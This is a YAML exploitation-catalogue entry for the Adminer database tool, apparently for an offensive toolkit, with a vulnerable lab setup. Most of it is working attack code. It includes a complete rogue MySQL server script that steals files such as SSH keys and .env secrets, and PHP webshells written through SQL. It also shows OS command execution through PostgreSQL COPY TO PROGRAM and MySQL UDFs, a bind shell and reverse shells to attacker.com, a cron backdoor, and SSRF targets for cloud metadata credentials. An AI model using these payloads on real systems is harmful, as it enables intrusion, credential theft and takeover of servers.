---
comment: |
  Adminer (formerly phpMinAdmin) is a single-file PHP database management tool.
  Two independent exploitation paths exist:

  1. Arbitrary file read via rogue MySQL server (Adminer <= 4.6.2): Adminer supports
     LOAD DATA LOCAL INFILE, which allows a MySQL server to request files from the
     client. By connecting Adminer to an attacker-controlled rogue MySQL server, the
     server can instruct Adminer to read any file accessible to the PHP process and
     transmit its contents to the attacker.

  2. SSRF via Elasticsearch driver (CVE-2021-21311, Adminer 4.0.0-4.7.8): The
     Elasticsearch login driver makes an outbound HTTP request to the server URL
     specified in the login form without validation, enabling arbitrary HTTP requests
     from the Adminer server to internal network endpoints.
docker:
  compose: "services:\n  adminer:\n    image: adminer:4.6.2\n    ports:\n      - \"\
    8080:8080\"\n    depends_on:\n      - db\n  db:\n    image: mysql:5.7\n    environment:\n\
    \      MYSQL_ROOT_PASSWORD: root\n      MYSQL_DATABASE: testdb\n"
  note: 'Starts Adminer 4.6.2 (vulnerable to the rogue MySQL file-read) backed by
    MySQL 5.7.

    Access Adminer at `http://localhost:8080`.

    Log in with server `db`, username `root`, password `root`, database `testdb`.

    To test the rogue MySQL file-read, run the server script on your host and set
    the

    Adminer server field to `host.docker.internal:3306`.

    '
functions:
  bind-shell:
  - code: |
      -- PostgreSQL: bind shell via COPY TO PROGRAM (requires superuser)
      COPY (SELECT '') TO PROGRAM 'ncat -lvp 12345 -e /bin/sh &';
    comment: |
      PostgreSQL COPY TO PROGRAM opens a bind shell on TCP 12345 via ncat.
      The & detaches ncat from the COPY command so it returns normally.
      Connect with: nc victim.com 12345
      Requires ncat (nmap package) on the PostgreSQL server host and superuser role.
    connector: tcp-client
    contexts:
      admin:
    platform: linux
    tty: false
  file-read:
  - code: "#!/usr/bin/env python3\n# Rogue MySQL server \u2014 reads an arbitrary\
      \ file from the Adminer host.\n# Usage: python3 rogue_mysql.py [target_file]\n\
      # Then connect Adminer to attacker.com:3306 using any credentials.\nimport socket,\
      \ sys\n\nFILE = sys.argv[1] if len(sys.argv) > 1 else '/etc/passwd'\n\ndef pkt(data,\
      \ seq):\n    return len(data).to_bytes(3, 'little') + seq.to_bytes(1, 'little')\
      \ + data\n\ns = socket.socket()\ns.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,\
      \ 1)\ns.bind(('0.0.0.0', 3306))\ns.listen(1)\nprint(f'[*] Listening :3306, targeting:\
      \ {FILE}')\n\nconn, addr = s.accept()\nprint(f'[+] Connection from {addr}')\n\
      \n# Send minimal MySQL greeting (protocol 10, version 5.7.0)\nconn.send(pkt(b'\\\
      x0a5.7.0\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n         \
      \     b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00',\
      \ 0))\nconn.recv(4096)  # client auth packet\nconn.send(pkt(b'\\x00\\x00\\x00\\\
      x02\\x00\\x00\\x00', 2))  # OK\nconn.recv(4096)  # COM_QUERY from Adminer\n\n\
      # Issue LOCAL DATA INFILE request for the target file\nconn.send(pkt(b'\\xfb'\
      \ + FILE.encode(), 1))\n\n# Receive and reassemble the file content\ndata =\
      \ b''\nwhile True:\n    chunk = conn.recv(65536)\n    if not chunk:\n      \
      \  break\n    plen = int.from_bytes(chunk[:3], 'little')\n    data += chunk[4:4\
      \ + plen]\n    if plen == 0:\n        break\nconn.send(pkt(b'\\x00\\x00\\x00\\\
      x02\\x00\\x00\\x00', 2))  # OK\n\nprint(f'\\n[+] Contents of {FILE}:\\n{data.decode(errors=\"\
      replace\")}')\nconn.close()\ns.close()\n"
    comment: "Adminer <= 4.6.2 supports LOAD DATA LOCAL INFILE, which enables a MySQL\
      \ server\nto pull arbitrary files from the connecting client (Adminer's PHP\
      \ process).\n\nAttack flow:\n1. Run the rogue MySQL server above on the attacker\
      \ machine (port 3306).\n2. Navigate to the Adminer login page on the victim\
      \ server.\n3. In the login form, set Server to attacker.com, enter any username/password/database.\n\
      4. Click Login \u2014 Adminer connects to the rogue server. The rogue server\
      \ responds\n   with a LOAD DATA LOCAL INFILE request, and Adminer transmits\
      \ the file contents.\n\nUseful target files:\n- /etc/passwd\n- /var/www/html/wp-config.php\
      \ (WordPress credentials)\n- /var/www/html/.env (Laravel/Symfony secrets)\n\
      - ~/.ssh/id_rsa (SSH private keys)\n\nThe PHP process user (www-data, apache,\
      \ nginx) determines which files are readable.\nFixed in Adminer 4.6.3.\n"
    contexts:
      unauthenticated:
    version: |-
      <= 4.6.2
  file-write:
  - binary: false
    code: "-- MySQL: write arbitrary text files via SELECT INTO OUTFILE\n-- (same\
      \ FILE privilege requirement as the existing file-read entry)\nSELECT '<?php\
      \ if(isset($_REQUEST[\"c\"])){system($_REQUEST[\"c\"]);} ?>'\nINTO OUTFILE '/var/www/html/shell.php';\n\
      \n-- Write a cron backdoor (if MySQL runs as root):\nSELECT '* * * * * root\
      \ bash -i >& /dev/tcp/attacker.com/12345 0>&1\\n'\nINTO OUTFILE '/etc/cron.d/backdoor';\n\
      \n-- Note: OUTFILE will error if the file already exists \u2014 choose a new\
      \ filename.\n"
    comment: "MySQL SELECT INTO OUTFILE writes the query result to a file on the MySQL\
      \ server host.\nRequires the FILE privilege and secure_file_priv='' or pointing\
      \ to the target directory.\nOUTFILE adds OS-appropriate line endings \u2014\
      \ use SELECT INTO DUMPFILE for binary content.\nCommon web root paths: /var/www/html\
      \ (Debian/Ubuntu), /srv/http (Arch),\nC:/xampp/htdocs (XAMPP), C:/wamp64/www\
      \ (WampServer).\n"
    contexts:
      admin:
  - binary: false
    code: |
      -- PostgreSQL: write arbitrary files via COPY TO (requires superuser role)
      COPY (SELECT '<?php if(isset($_REQUEST["c"])){system($_REQUEST["c"]);} ?>')
      TO '/var/www/html/shell.php';

      -- Read system files (COPY FROM reads a file into a table):
      CREATE TEMP TABLE t (c text);
      COPY t FROM '/etc/passwd';
      SELECT * FROM t;
    comment: "PostgreSQL COPY TO writes a query result to a file on the PostgreSQL\
      \ server host.\nRequires superuser role. The file is owned by the postgres OS\
      \ user.\nCOPY FROM reads a file into a table \u2014 effectively a file-read\
      \ primitive.\nCombine with the rce entry to deploy a webshell if a PHP-capable\
      \ web server\nshares the same host as the PostgreSQL instance.\n"
    contexts:
      admin:
    platform: linux
  rce:
  - code: |
      -- PostgreSQL: execute OS commands via COPY TO PROGRAM (requires superuser role)
      -- Run directly in the Adminer SQL query interface connected to a PostgreSQL database:
      COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned';
      -- Read result:
      COPY (SELECT pg_read_file('/tmp/pwned')) TO STDOUT;

      -- Alternative: create a custom function mapping to libc system() (PostgreSQL < 14):
      CREATE OR REPLACE FUNCTION sys(cstring) RETURNS int
        AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE C STRICT;
      SELECT sys('id > /tmp/pwned2');
    comment: "PostgreSQL's COPY TO PROGRAM (added in 9.3) passes the TO argument to\
      \ /bin/sh -c,\nexecuting arbitrary OS commands as the PostgreSQL process user\
      \ (commonly postgres).\nRequires the connected user to have superuser role in\
      \ PostgreSQL.\nIn Adminer, connect to a PostgreSQL instance (local or remote)\
      \ with superuser\ncredentials, navigate to the SQL query tab, and run the COPY\
      \ statement directly.\nThe libc system() UDF alternative works on older PostgreSQL\
      \ versions and requires\nthat /lib/x86_64-linux-gnu/libc.so.6 (or equivalent)\
      \ is loadable as a PostgreSQL\nextension \u2014 effective on most Debian/Ubuntu\
      \ PostgreSQL installations.\n"
    contexts:
      admin:
    platform: linux
  - code: |
      -- MySQL: execute OS commands via User-Defined Function (UDF) using raptor_udf2
      -- Requires: FILE privilege, SELECT INTO DUMPFILE on plugin dir, and MySQL running as root
      -- Step 1: write the UDF shared library to the MySQL plugin directory:
      SELECT @@plugin_dir;  -- confirm plugin directory path
      SELECT 0x<hex_of_raptor_udf2.so> INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';

      -- Step 2: create the UDF:
      CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';

      -- Step 3: execute a command:
      SELECT do_system('id > /tmp/pwned');
    comment: |
      MySQL UDF (User-Defined Function) RCE: loads a compiled shared library as a MySQL
      plugin to expose a function that calls system(). Requires:
      - MySQL FILE privilege (to write the .so file via SELECT INTO DUMPFILE)
      - Write access to @@plugin_dir (common when MySQL runs as root)
      - raptor_udf2.so compiled for the target architecture
        (github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c)
      The hex string in SELECT INTO DUMPFILE must be the exact binary content of the .so
      file. Use: xxd -p raptor_udf2.so | tr -d '\n' to generate the hex string.
    contexts:
      admin:
    platform: linux
  reverse-shell:
  - blind: true
    code: |
      -- PostgreSQL: reverse shell via COPY TO PROGRAM (requires superuser role)
      COPY (SELECT '') TO PROGRAM 'bash -c ''bash -i >& /dev/tcp/attacker.com/12345 0>&1'' &';
    comment: |
      PostgreSQL COPY TO PROGRAM executes the supplied string via /bin/sh -c on the
      PostgreSQL server host. The trailing & detaches the shell so COPY returns normally.
      The shell runs as the postgres OS user. Requires superuser role.
      Execute directly in the Adminer SQL query tab connected to a PostgreSQL database.
    contexts:
      admin:
    listener: tcp-server
    platform: linux
    tty: false
  - blind: true
    code: "-- MySQL: reverse shell via UDF do_system() (after UDF setup \u2014 see\
      \ rce entry)\nSELECT do_system('bash -c ''bash -i >& /dev/tcp/attacker.com/12345\
      \ 0>&1'' &');\n\n-- Or via MySQL EVENT if UDF is unavailable (requires EVENT\
      \ privilege):\nSET GLOBAL event_scheduler = ON;\nCREATE EVENT shell ON SCHEDULE\
      \ AT CURRENT_TIMESTAMP + INTERVAL 1 SECOND\n  DO SELECT sys_exec('bash -i >&\
      \ /dev/tcp/attacker.com/12345 0>&1');\n"
    comment: |
      MySQL reverse shell via the raptor UDF (see rce entry for setup steps).
      The UDF do_system() calls system() with the shell command.
      The trailing & detaches the process. Requires superuser and FILE privilege.
    contexts:
      admin:
    listener: tcp-server
    platform: linux
    tty: false
  ssrf:
  - code: |
      # Navigate to the Adminer login page and select "Elasticsearch" as the system.
      # Set the Server field to an internal URL and click Login.
      # Adminer makes an outbound HTTP GET request to the specified URL.

      # Examples of useful targets:
      # Cloud metadata (AWS IMDSv1):
      #   http://169.254.169.254/latest/meta-data/iam/security-credentials/
      # Cloud metadata (GCP):
      #   http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
      # Cloud metadata (Azure):
      #   http://169.254.169.254/metadata/instance?api-version=2021-02-01
      # Internal services:
      #   http://192.168.1.1/admin
      #   http://localhost:8080/actuator/env

      # The HTTP response from the internal service is reflected in the Adminer error
      # message or login page, making this a semi-blind SSRF.
    comment: |
      CVE-2021-21311: the Elasticsearch driver in Adminer passes the user-supplied
      Server field directly to an HTTP client without validation. Adminer makes a GET
      request to http://<server>/ when the Login button is clicked.

      The full response body from the internal service is reflected in the Adminer
      interface, making this a non-blind SSRF useful for internal network probing and
      cloud metadata extraction.
      Fixed in Adminer 4.7.9.
    contexts:
      unauthenticated:
    version: |-
      4.0.0 - 4.7.8
  webshell:
  - code: |
      -- MySQL: deploy a PHP webshell via SELECT INTO OUTFILE
      SELECT '<?php if(isset($_REQUEST["c"])){echo "<pre>",shell_exec($_REQUEST["c"]),"</pre>";}?>'
      INTO OUTFILE '/var/www/html/shell.php';

      -- Access the deployed webshell:
      -- http://victim.com/shell.php?c=id
    comment: |
      Deploys a PHP webshell to the web server document root via MySQL OUTFILE.
      Requires the MySQL FILE privilege and a permissive secure_file_priv setting.
      The webshell runs as the web server user (www-data, apache, or daemon), which
      may differ from the MySQL process user.
      Adjust the OUTFILE path to match the target web root.
      Access at: http://victim.com/shell.php?c=id
    contexts:
      admin:
...
